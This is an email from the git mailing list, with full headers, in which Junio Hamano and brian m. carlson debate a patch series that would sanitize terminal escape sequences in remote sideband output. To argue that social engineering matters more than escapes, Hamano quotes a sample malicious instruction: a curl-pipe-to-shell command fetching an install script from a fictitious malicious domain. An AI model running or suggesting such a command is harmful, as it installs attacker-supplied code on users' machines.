Received: from fhigh-a3-smtp.messagingengine.com (fhigh-a3-smtp.messagingengine.com [103.168.172.154])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 442AC192B96
	for <git@vger.kernel.org>; Thu, 16 Jan 2025 06:45:17 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=103.168.172.154
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1737009923; cv=none; b=QA55VDPXRSOjp1tbmO/BcJP+5lal1vwB19uuwFIFYy64WETAnW0Syxp9V9s0oo6cqkpUq9zY5YiPNSr4KGmwOgFbANm74lYtYM2EY8SAJvhO5iV+Z3m6NcAX9Cbf1HGIgtjIiMepj4IsGf2Janau6mzkBoRds6/HQWbBujLEqIQ=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1737009923; c=relaxed/simple;
	bh=Djehm21JXM2CwC0yvHvmYunGKEJRyTzNugPgMcYqG3M=;
	h=From:To:Cc:Subject:In-Reply-To:References:Date:Message-ID:
	 MIME-Version:Content-Type; b=dSFoaGg8dRmqNxKQ9Z9dC/V5sSZsMkyJhKd4JBy/DDGqTSmEijQshCnFe57KTkJC+Ki4Bgb6+6KECBx6hyA/4Fv3i/SuGsYs5TPOWbCJE6TONwW5zt9JNcnlOX52iIZ2VW4aCIlXQ+PYDzH697X+lmwIxlh5uQLLQAuffazmHN4=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=pobox.com; spf=pass smtp.mailfrom=pobox.com; dkim=pass (2048-bit key) header.d=pobox.com header.i=@pobox.com header.b=u44aI51T; dkim=pass (2048-bit key) header.d=messagingengine.com header.i=@messagingengine.com header.b=fUBrFYfB; arc=none smtp.client-ip=103.168.172.154
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=pobox.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=pobox.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=pobox.com header.i=@pobox.com header.b="u44aI51T";
	dkim=pass (2048-bit key) header.d=messagingengine.com header.i=@messagingengine.com header.b="fUBrFYfB"
Received: from phl-compute-03.internal (phl-compute-03.phl.internal [10.202.2.43])
	by mailfhigh.phl.internal (Postfix) with ESMTP id 3158A11400DF;
	Thu, 16 Jan 2025 01:45:16 -0500 (EST)
Received: from phl-frontend-02 ([10.202.2.161])
  by phl-compute-03.internal (MEProxy); Thu, 16 Jan 2025 01:45:16 -0500
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=pobox.com; h=cc
	:cc:content-type:content-type:date:date:from:from:in-reply-to
	:in-reply-to:message-id:mime-version:references:reply-to:subject
	:subject:to:to; s=fm1; t=1737009916; x=1737096316; bh=oosOdetSDB
	PqxISMW8X+doVwxOvMPsjVMjkhEcIKxs0=; b=u44aI51TBuaxByycMhXd36xoz3
	FRWZWeZHJQkxoTvOUMOciYzT4V5JHkojLiytltt2dU13yM8MZuZ27YUQSdzPM9Je
	S8RW24d/l0AwU5bkiNq+p65IgVVpKNIzOkWvc5nArUDZ6nv64nVgnIigOt1ZJ7UW
	SlpbR+firAJn07C+QHpzwgunHOxv4zLFu+nHnOMkbvbcPldEL6vt0klwjrOovVxK
	shfExAvmsTxmMZTWVgRyWsibR02znlVa6bELt1HfGbJq2TJHywCfkLDcB6WclfmB
	2dbQWwLL8FOnpZL8xUqfaFUUUcAgShG8iFFGCmdtWLvJ14ABwdUhwLkj2KUw==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	messagingengine.com; h=cc:cc:content-type:content-type:date:date
	:feedback-id:feedback-id:from:from:in-reply-to:in-reply-to
	:message-id:mime-version:references:reply-to:subject:subject:to
	:to:x-me-proxy:x-me-sender:x-me-sender:x-sasl-enc; s=fm2; t=
	1737009916; x=1737096316; bh=oosOdetSDBPqxISMW8X+doVwxOvMPsjVMjk
	hEcIKxs0=; b=fUBrFYfBotfVLMNB9ISdrkINjUewUcommhEt+CdIJaMJrcsLuK/
	oNsEbpXmH3yq6njv2QjNGXHLSodDHGFK9T++Gr8deDYGmEmfk3RiWHcTEKlACEgv
	RpGK9mvo+3tjRuy/LTfmtpwVgZUroHQeSQGAu3HS4XnszH0TzAr0DS0csK93CIiL
	BWyQmaZ1PLKinCcDJ+o5yTBWbRFYfY8yAB3h7wIx9MoD2Gt/e8PF1CGDPs0D7cBW
	yXwg/I2IckIieHuudQ5UHHKjnPVlY4OEHPpOfwefDxjvIJGKY+GP4HoQcC3umTNa
	a7OLo9Ir8GEykx6hEl4TCEuFXVDJ/m1ABPg==
X-ME-Sender: <xms:-6qIZywknLEOEwH0Y2NDhaydIWR2OJBrd27sTTXgetz9Onb3WoFwCA>
    <xme:-6qIZ-QKgbC3WZ5-FxgFiGeSCIw7gJsVBBmuuCfBRrspthkucT9xMJlP7hZtO4Bsk
    Z4lM8h4oME0HpP-ag>
X-ME-Received: <xmr:-6qIZ0XTStC3-XTQZJK_HA6Q08bPRZlzlHBqQ3CzEwquvUCwijBoVLlFh8f_HWiaTe0h9gFkNxsQ4K1HB6M9AQ1shXQJWOef8WtI>
X-ME-Proxy-Cause: gggruggvucftvghtrhhoucdtuddrgeefuddrudeitddgleegucetufdoteggodetrfdotf
    fvucfrrhhofhhilhgvmecuhfgrshhtofgrihhlpdggtfgfnhhsuhgsshgtrhhisggvpdfu
    rfetoffkrfgpnffqhgenuceurghilhhouhhtmecufedttdenucesvcftvggtihhpihgvnh
    htshculddquddttddmnecujfgurhephffvvefujghffffkfgggtgesthdtofdttdertden
    ucfhrhhomheplfhunhhiohcuvecujfgrmhgrnhhouceoghhithhsthgvrhesphhosghogi
    drtghomheqnecuggftrfgrthhtvghrnhepleeggedttdetheduffefueeufedtveeuvddu
    gfevhfelkeejleelgeekiefggfeinecuffhomhgrihhnpeigiihinhhsthgrlhhlrdhshh
    enucevlhhushhtvghrufhiiigvpedtnecurfgrrhgrmhepmhgrihhlfhhrohhmpehgihht
    shhtvghrsehpohgsohigrdgtohhmpdhnsggprhgtphhtthhopeehpdhmohguvgepshhmth
    hpohhuthdprhgtphhtthhopehsrghnuggrlhhssegtrhhushhthihtohhothhhphgrshht
    vgdrnhgvthdprhgtphhtthhopehgihhtghhithhgrggughgvthesghhmrghilhdrtghomh
    dprhgtphhtthhopehgihhtsehvghgvrhdrkhgvrhhnvghlrdhorhhgpdhrtghpthhtohep
    jhhohhgrnhhnvghsrdhstghhihhnuggvlhhinhesghhmgidruggvpdhrtghpthhtohepgh
    hithhsthgvrhesphhosghogidrtghomh
X-ME-Proxy: <xmx:-6qIZ4heK8jgVLqSy5Tlbp9nT9bd4RbN115nnAHT3Hw2fuGA4XxQ3g>
    <xmx:-6qIZ0A0CYNo44GJxAbDw5Ngh8QTucz3Xabf5uRheexA10QUoIJFHg>
    <xmx:-6qIZ5Jbwzt0-cao4UXJ31jKZUNv2kB-nIzQ84-EiqTaJd3eFDs7Ag>
    <xmx:-6qIZ7C6qG-S9XHNYN0nvGdW2MV58TBKzBa4r0p3IaXodNFmSc7U-Q>
    <xmx:_KqIZz4Jc_QPaOUN9uMvFGRonOrmebzCRBWER38Rs33gsFnQnhAZEMZB>
Feedback-ID: if26b431b:Fastmail
Received: by mail.messagingengine.com (Postfix) with ESMTPA; Thu,
 16 Jan 2025 01:45:15 -0500 (EST)
From: Junio C Hamano <gitster@pobox.com>
To: "brian m. carlson" <sandals@crustytoothpaste.net>
Cc: Johannes Schindelin via GitGitGadget <gitgitgadget@gmail.com>,
  git@vger.kernel.org,  Johannes Schindelin <johannes.schindelin@gmx.de>
Subject: Re: [PATCH 0/3] Sanitize sideband channel messages
In-Reply-To: <Z4bqMYKRP7Gva5St@tapette.crustytoothpaste.net> (brian
	m. carlson's message of "Tue, 14 Jan 2025 22:50:25 +0000")
References: <pull.1853.git.1736878772.gitgitgadget@gmail.com>
	<Z4bqMYKRP7Gva5St@tapette.crustytoothpaste.net>
Date: Wed, 15 Jan 2025 22:45:13 -0800
Message-ID: <xmqqwmevtfye.fsf@gitster.g>
User-Agent: Gnus/5.13 (Gnus v5.13)
Precedence: bulk
X-Mailing-List: git@vger.kernel.org
List-Id: <git.vger.kernel.org>
List-Subscribe: <mailto:git+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:git+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain

"brian m. carlson" <sandals@crustytoothpaste.net> writes:

> Where pre-receive hooks are available, people frequently run various
> commands to test and analyze code in them, including build or static
> analysis tools, such as Rust's Cargo.  Cargo is capable of printing a
> wide variety of escape sequences in its output, including `\e[K`, which
> overwrites text to the right (e.g., for progress bars and status output
> much like Git produces), and sequences for hyperlinks.  Stripping these
> sequences would break the output in ways that would be confusing to the
> user (since they work fine in a regular terminal) and hard to
> reproduce or fix.

You have ruled out the attack vector that lets bytestream sent to
the terminal emulator to somehow cause arbitrary input bytes added
(which may require the final <ENTER> from the user but that is not
much of consolation), and I tend to agree with you on that point.

With that misfeature out of the picture, I am not sure why terminal
escape sequences that may clear or write-over things on the screen
are of particular interest.  If the malicious remote end says
something like

    To proceed, open another window and type this command:

	$ curl https://my.malicious.xz/install.sh | sh

to its output, even if the message is shown with the "remote: "
prefix on the receiving local client, wouldn't that cause certain
percentage of end-user population to copy-and-paste that command
anyway?

> I agree that this would have been a nice feature to add at the beginning
> of the development of the sideband feature, but I fear that it is too
> late to make an incompatible change now.

So I am not so sure even it would have been a "nice feature" to disallow
sideband messages to carry terminal escape sequences to begin with.

> I realize that you've provided an escape hatch, but as we've seen with
> other defense-in-depth measures, that doesn't avoid the inconvenience
> and hassle of dealing with those changes and the costs of deploying
> fixes everywhere.

One more thing that I am not so happy about these "escape hatches"
is that they tend to be all or nothing (not limited to this round,
but common to other defense-in-depth attempts).  Having to say "I
trust them completely" is something that would make people uneasy.

> We need to consider the costs and impact of these
> patches on our users, including the burden of dealing with incompatible
> changes, and given the fact that this problem can occur in a wide
> variety of other contexts which you are not solving here and which would
> be better solved more generally in terminal emulators themselves, I
> don't think the benefits of this approach outweigh the downsides.
>
> I do agree that there are terminal emulators which have some surprising
> and probably insecure behaviour, as we've discussed in the past, but
> because I believe those issues are more general and could be a problem
> for any terminal-using program, I continue to believe that those issues
> are best addressed in the terminal emulator itself.
